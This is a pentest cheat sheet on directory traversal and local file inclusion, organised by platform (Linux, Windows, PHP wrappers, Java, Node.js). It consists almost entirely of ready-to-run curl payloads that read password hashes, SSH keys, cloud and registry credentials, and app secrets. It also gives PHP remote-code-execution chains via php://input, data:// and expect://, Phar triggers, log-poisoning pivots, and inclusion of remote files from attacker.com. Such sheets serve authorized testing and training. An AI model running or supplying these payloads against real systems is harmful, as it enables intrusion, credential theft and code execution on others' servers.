---
aliases:
  - Path Traversal Linux Targets
  - Path Traversal Windows Targets
  - PHP Wrappers
tags:
  - type/cheatsheet
  - vuln/path-traversal
  - vuln/lfi
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Directory Traversal]]'
  - '[[File Inclusion]]'
---
# Directory Traversal - Vectores por OS / Stack

***

## Linux Objetivos de Alto Valor

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=../../../etc/passwd'` | Users + UIDs (world-readable) | Standard probe. |
| `curl 'https://target/?file=../../../etc/shadow'` | Password hashes (root-only) | Privileged. |
| `curl 'https://target/?file=../../../etc/hostname'` | Hostname | Network recon. |
| `curl 'https://target/?file=../../../etc/hosts'` | Internal host mappings | Internal hostname leak. |
| `curl 'https://target/?file=../../../etc/issue'` | OS banner distro | Distro identify. |
| `curl 'https://target/?file=../../../etc/os-release'` | OS metadata | Distro recon. |
| `curl 'https://target/?file=../../../etc/sudoers'` | sudo rules | Root-only. |
| `curl 'https://target/?file=../../../etc/crontab'` | System cron jobs | Scheduled tasks. |
| `curl 'https://target/?file=../../../etc/cron.daily/'` | Daily cron scripts | Scheduled. |
| `curl 'https://target/?file=../../../proc/self/environ' \| strings` | Process env vars con secrets | High-value secrets. |
| `curl 'https://target/?file=../../../proc/self/cmdline' \| tr '\0' ' '` | Command-line args `--password=` | Cmdline leak. |
| `curl 'https://target/?file=../../../proc/self/status'` | Process UID/GID/state | Privilege recon. |
| `curl 'https://target/?file=../../../proc/self/maps'` | Memory map module bases | ASLR recon. |
| `curl 'https://target/?file=../../../proc/self/fd/3'` | Open file descriptor 3 | Active FD. |
| `curl 'https://target/?file=../../../proc/version'` | Kernel version | Exploit selection. |
| `curl 'https://target/?file=../../../proc/mounts'` | Container/mount detect | Container detect. |
| `curl 'https://target/?file=../../../root/.bash_history'` | Root shell history | Post-exploit. |
| `curl 'https://target/?file=../../../root/.ssh/id_rsa'` | Root SSH key | Direct access. |
| `curl 'https://target/?file=../../../root/.ssh/authorized_keys'` | Authorized keys | Add own key. |
| `curl 'https://target/?file=../../../root/.aws/credentials'` | AWS creds | Cloud takeover. |
| `curl 'https://target/?file=../../../root/.docker/config.json'` | Docker registry creds | Push images. |
| `curl 'https://target/?file=../../../root/.git-credentials'` | Git creds | Repo access. |
| `curl 'https://target/?file=../../../root/.npmrc'` | NPM tokens | Package publish. |
| `curl 'https://target/?file=../../../var/log/apache2/access.log'` | Apache access log (poison pivot) | Log poison RCE. |
| `curl 'https://target/?file=../../../var/log/nginx/access.log'` | nginx log poison candidate | Log poison. |
| `curl 'https://target/?file=../../../var/log/auth.log'` | SSH login events | Auth recon. |
| `curl 'https://target/?file=../../../var/lib/jenkins/secrets.xml'` | Jenkins master cipher | Jenkins secrets. |
| `curl 'https://target/?file=../../../var/www/html/wp-config.php'` | WordPress DB creds | WordPress DB. |
| `curl 'https://target/?file=../../../var/www/html/.env'` | Modern app .env secrets | Modern app secrets. |
^pt-stack-linux

___

## Windows Objetivos de Alto Valor

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=..\..\..\windows\win.ini'` | Win.ini readable probe | Windows probe. |
| `curl 'https://target/?file=..\..\..\windows\system32\drivers\etc\hosts'` | Windows hosts file | Network info. |
| `curl 'https://target/?file=..\..\..\windows\system.ini'` | Legacy system.ini | Recon. |
| `curl 'https://target/?file=..\..\..\windows\system32\config\sam'` | SAM hashes (typically locked) | Privileged. |
| `curl 'https://target/?file=..\..\..\windows\system32\config\system'` | System hive boot key | Privileged. |
| `curl 'https://target/?file=..\..\..\windows\repair\sam'` | Old SAM backup accessible | Edge backup. |
| `curl 'https://target/?file=..\..\..\windows\debug\netsetup.log'` | Domain join log | AD recon. |
| `curl 'https://target/?file=..\..\..\inetpub\wwwroot\web.config'` | IIS connection strings | IIS app. |
| `curl 'https://target/?file=..\..\..\inetpub\logs\LogFiles\W3SVC1\u_ex$(date +%y%m%d).log'` | IIS daily log | Log poison candidate. |
| `curl 'https://target/?file=..\..\..\Users\Administrator\Desktop\Notes.txt'` | Admin user files | Direct. |
| `curl 'https://target/?file=..\..\..\Users\Administrator\AppData\Roaming\Microsoft\Credentials\'` | Cached creds (DPAPI encrypted) | DPAPI combo. |
| `curl 'https://target/?file=..\..\..\Users\Administrator\NTUSER.DAT'` | User registry (locked) | Edge locked. |
| `curl 'https://target/?file=%SYSTEMROOT%\win.ini'` | Env var expansion | If app expands. |
| `curl 'https://target/?file=\\?\C:\windows\win.ini'` | UNC long-path syntax | UNC bypass. |
| `curl 'https://target/?file=..\..\..\tomcat\conf\tomcat-users.xml'` | Tomcat creds | Tomcat Win. |
| `curl 'https://target/?file=..\..\..\inetpub\wwwroot\appsettings.json'` | .NET Core config secrets | Modern .NET. |
| `curl 'https://target/?file=..\..\..\xampp\apache\conf\httpd.conf'` | XAMPP Apache config | XAMPP. |
| `curl 'https://target/?file=..\..\..\wamp\www\config.inc.php'` | WAMP config | WAMP. |
| `curl 'https://target/?file=..\..\..\ProgramData\Microsoft\Group Policy\History\'` | GPO history | AD recon. |
| `curl 'https://target/?file=..\..\..\Windows\Panther\Unattend.xml'` | Unattended install creds | Build artifact. |
^pt-stack-windows

___

## PHP Wrappers (Path Traversal + LFI)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?file=file:///etc/passwd'` | file:// URI standard | File scheme. |
| `curl 'https://target/?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php' \| base64 -d` | Read PHP source as base64 | Source disclosure. |
| `curl 'https://target/?file=php://filter/read=string.rot13/resource=index.php'` | ROT13 light obfuscation | Filter bypass. |
| `curl 'https://target/?file=php://filter/convert.base64-encode/resource=../config.php' \| base64 -d` | Chain decode source | Source recon. |
| `curl -X POST -d '<?php system($_GET["c"]); ?>' 'https://target/?file=php://input&c=id'` | php://input + LFI = RCE | RCE chain. |
| `curl 'https://target/?file=data://text/plain;base64,'$(echo '<?php system("id"); ?>' \| base64 -w0)` | data:// inline PHP RCE | RCE chain. |
| `curl 'https://target/?file=expect://id'` | expect:// command RCE direct | PHP expect ext. |
| `curl 'https://target/?file=phar://uploaded.jpg/test'` | Phar deserialization trigger | Phar combo. |
| `curl --upload-file polyglot.phar 'https://target/upload' && curl 'https://target/?file=phar:///tmp/polyglot.phar/x'` | Polyglot Phar/JPG upload + trigger | File upload + Phar. |
| `curl 'https://target/?file=zip://uploaded.zip%23path/inside'` | ZIP slip path read inside ZIP | ZIP traversal. |
| `curl 'https://target/?file=compress.zlib://file.gz'` | gzip stream read | Compressed read. |
| `curl 'https://target/?file=compress.bzip2://file.bz2'` | bzip2 stream | Compressed read. |
| `curl 'https://target/?file=glob://var/www/*.php'` | Glob expand list files | Glob enum. |
| `curl 'https://target/?file=ftp://anonymous:x@attacker.com/file.php'` | FTP scheme LFI external | Network LFI. |
| `curl 'https://target/?file=ssh2://user@attacker.com/file'` | SSH2 scheme (PHP ssh2 ext) | Edge. |
| `curl 'https://target/?file=php://filter/zlib.deflate/convert.base64-encode/resource=index.php'` | Chained filters obfuscate | Filter chain. |
| `python3 -c "from urllib.parse import quote; print(quote('php://filter/convert.base64-encode/resource=/etc/passwd'))"` | Encode wrapper for query param | Encode helper. |
^pt-stack-php-wrappers

___

## Java Path Handling

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/..;/admin'` | Tomcat `..;/` path bypass | Tomcat-specific. |
| `curl 'https://target/static/..%2f..%2fconfig.properties'` | Spring static dir bypass | Spring Boot. |
| `curl 'https://target/api/file?path=../../etc/passwd'` (con `getRealPath`) | `ServletContext.getRealPath` traversal | Java app. |
| `curl 'https://target/api/resource?name=../config.properties'` (Spring resource) | Spring resource loader bypass | Spring. |
| `curl 'https://target/api/file?path=../../etc/shadow'` (con `Paths.get` no normalize) | NIO Paths.get sin normalize | Java NIO bug. |
| `curl 'https://target/_async?file=../../etc/passwd'` (WebLogic) | WebLogic `_async` path bypass | WebLogic. |
| `curl 'https://target/jsp/include?file=../../../etc/passwd'` (JSP include) | JSP `<jsp:include>` traversal | JSP context. |
| `curl 'https://target/servlet/Display?file=../../../etc/passwd'` | Servlet routing path | Custom servlet. |
| `curl 'https://target/files?name=../etc/passwd%00.txt'` (Apache Commons FileUpload old) | Commons FileUpload traversal old | Old CVE. |
| `nuclei -t http/cves/2017/CVE-2017-12617.yaml -u https://target` (Tomcat PUT) | Tomcat CVE-2017-12617 traversal PUT | Tomcat 7-9. |
| `nuclei -t http/cves/2020/CVE-2020-1938.yaml -u https://target` (Ghostcat AJP) | Tomcat Ghostcat traversal | Tomcat AJP. |
| `curl 'https://target/META-INF/MANIFEST.MF'` | Java app manifest leak | Manifest leak. |
| `curl 'https://target/WEB-INF/web.xml'` | Java web.xml leak | Web.xml leak. |
| `curl 'https://target/WEB-INF/classes/application.properties'` | App properties leak | Properties leak. |
| `curl 'https://target/..;/WEB-INF/web.xml'` | Tomcat `..;/` + WEB-INF leak | Combined. |
^pt-stack-java

___

## Node.js / Express Path Quirks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/files?name=../../etc/passwd'` (con `fs.readFile(userInput)`) | Direct fs.readFile user input | Vulnerable. |
| `curl 'https://target/static/../../etc/passwd'` (Express static) | `express.static` no-auth bypass | Static middleware. |
| `curl 'https://target/download?path=../../etc/passwd'` (con `res.sendFile`) | sendFile user path | Vulnerable. |
| `curl 'https://target/api/file?path=../../etc/passwd'` (con `path.join(base, userInput)`) | path.join not preventing absolute path | Path module bug. |
| `curl 'https://target/api/file?path=/etc/passwd'` (path.resolve abs override) | path.resolve absolute path override | Resolve bug. |
| `curl 'https://target/lookup?lang=../../../etc/passwd'` (con `require(userInput)`) | Dynamic require traversal RCE | Require RCE. |
| `curl 'https://target/module?name=../../../etc/passwd'` (con dynamic `import(userInput)`) | Dynamic import traversal | ES dynamic import. |
| `curl 'https://target/api/file?path=symlink_to_secret'` (post-`fs.realpath`) | Symlink TOCTOU follow | Symlink combo. |
| `curl 'https://target/api/file?path=..%2f..%2f..%2fetc%2fpasswd'` (URL-encoded) | URL-encoded bypass | Encoding. |
| `curl 'https://target/files/:filename' --data-raw '../../../etc/passwd'` (route param) | Express route param traversal | Standard route. |
| `curl 'https://target/api/file?path=C:\windows\win.ini'` (Win path on Windows server) | path.win32 vs path.posix mix | Win Node. |
| `curl 'https://target/api/file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd'` | Encoded `..` Node | Encode bypass. |
| `curl 'https://target/api/file?path=..\..\etc\passwd'` (backslash on Linux Node) | Backslash bypass Linux Node | Backslash Linux. |
| `node -e "const path = require('path'); console.log(path.join('/var/www/', '../../etc/passwd'))"` | Local Node path.join PoC | Reproduce locally. |
^pt-stack-node

***
